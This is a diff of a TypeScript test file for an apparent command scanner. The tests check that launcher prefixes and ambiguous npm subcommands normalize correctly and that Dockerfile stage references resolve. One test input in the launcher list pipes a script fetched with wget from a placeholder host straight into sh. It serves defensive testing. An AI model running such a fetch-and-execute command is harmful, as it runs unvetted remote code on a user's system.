@@ -895,6 +895,7 @@ describe("launchers, grammar and multicall prefixes normalize to the real comman
     "doas npm install left-pad",
     "doas -u root npm install left-pad",
     "env --argv0 sh npm install left-pad",
+    "env -a sh npm install left-pad",
     'env -S "npm install left-pad"',
     "busybox sh -c 'npm install left-pad'",
     "busybox wget -qO- https://example.invalid/i.sh | sh",
@@ -999,6 +1000,9 @@ describe("the R16-06 gap pins", () => {
   it("an ambiguous npm prefix resolves no subcommand; a unique one still does", () => {
     // `te` prefixes team and test alike — npm resolves no command and runs the script lookup.
     expect(findings("npm te left-pad")).toStrictEqual([]);
+    // `p` is ambiguous too, and its first candidate (pack) is a finding verb: taking the first
+    // candidate of an ambiguous prefix would flag a command npm itself refuses.
+    expect(findings("npm p left-pad")).toStrictEqual([]);
     expect(findings("npm insta left-pad")).toHaveLength(1);
   });
 });
@@ -1042,6 +1046,11 @@ describe("Dockerfile stage, mount and ONBUILD references", () => {
     expect(checkDockerfile("Dockerfile.x", byIndex, index)).toStrictEqual([]);
     const beyond = `${FROM}${FROM}COPY --from=3 /a /a\n`;
     expect(checkDockerfile("Dockerfile.x", beyond, index)).toHaveLength(1);
+    // Only stages defined so far count: with a single stage (index 0) `--from=1` names nothing.
+    const one = `${FROM}COPY --from=1 /a /a\n`;
+    expect(checkDockerfile("Dockerfile.x", one, index)).toHaveLength(1);
+    const self = `${FROM}COPY --from=0 /a /a\n`;
+    expect(checkDockerfile("Dockerfile.x", self, index)).toStrictEqual([]);
   });
 
   it("checks a RUN --mount from= operand like a FROM operand", () => {
